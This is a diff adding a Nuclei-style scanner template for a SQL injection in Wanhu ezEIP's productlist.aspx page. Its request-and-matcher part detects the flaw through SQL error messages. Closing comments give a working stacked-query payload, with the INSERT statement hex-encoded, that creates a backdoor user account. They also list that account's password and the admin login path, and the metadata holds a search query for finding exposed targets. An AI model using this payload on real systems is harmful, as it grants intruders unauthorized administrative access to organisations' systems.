@@ -1,0 +1,36 @@
+id: wanhu-ezeip-productlist-sqli-to-useradd
+
+info:
+  name: 万户ezeip productlist.aspx sql注入导致任意用户添加
+  author: pphua
+  severity: high
+  reference:
+    - none
+  tags: wanhu,oa,ezeip,useradd,sqli
+  metadata:
+    veified: true
+    hunter-query: app.name="万户 ezEip"
+
+http:
+  - raw:
+      - |
+        GET /shop/productlist.aspx?ob=price&price=asc&svids=cnvd HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Moziilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36
+
+      - |
+        GET /shop/productlist.aspx?ob=price&price=asc&svids=cnvd; HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Moziilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code_1 == 200 && status_code_2 == 200 && contains_all(body_1,'错误信息','列名','HttpUnhandledException') && contains_all(body_2,'错误信息','附近有语法错误','HttpUnhandledException')"
+
+# 添加用户payload:
+# /shop/productlist.aspx?ob=price&price=asc&svids=1);declare%20@@s%20varchar(2000)%20set%20@@s=0x494e5345525420494e544f2064626f2e576869725f5365635f557365727320284c6f67696e4e616d652c50617373776f72642c5265616c4e616d652c456d61696c2c526f6c657349642c52656d61726b732c4c6173744c6f67696e54696d652c4c6173744c6f67696e49502c4c6f67696e547970652c53746174652c497344656c2c437265617465557365722c437265617465446174652c557064617465557365722c557064617465446174652c536f72742c53797374656d4c616e67756167652c53797374656d536b696e292056414c554553202827636865636b5f306461795f76756c272c2741463937414631383544303334464438453442433534343938343336313438363734343936323931272c27272c27272c2731272c27272c27272c27272c4e554c4c2c2730272c2730272c4e554c4c2c27272c4e554c4c2c27272c27272c2731272c27626c75652729%20execute(@@s)--+
+
+# 用户名：check_0day_vul
+# 登录密码：Qin_test_0day!  
+# 后台登录地址：/whir_system/module/security/ezEIP_login.aspx
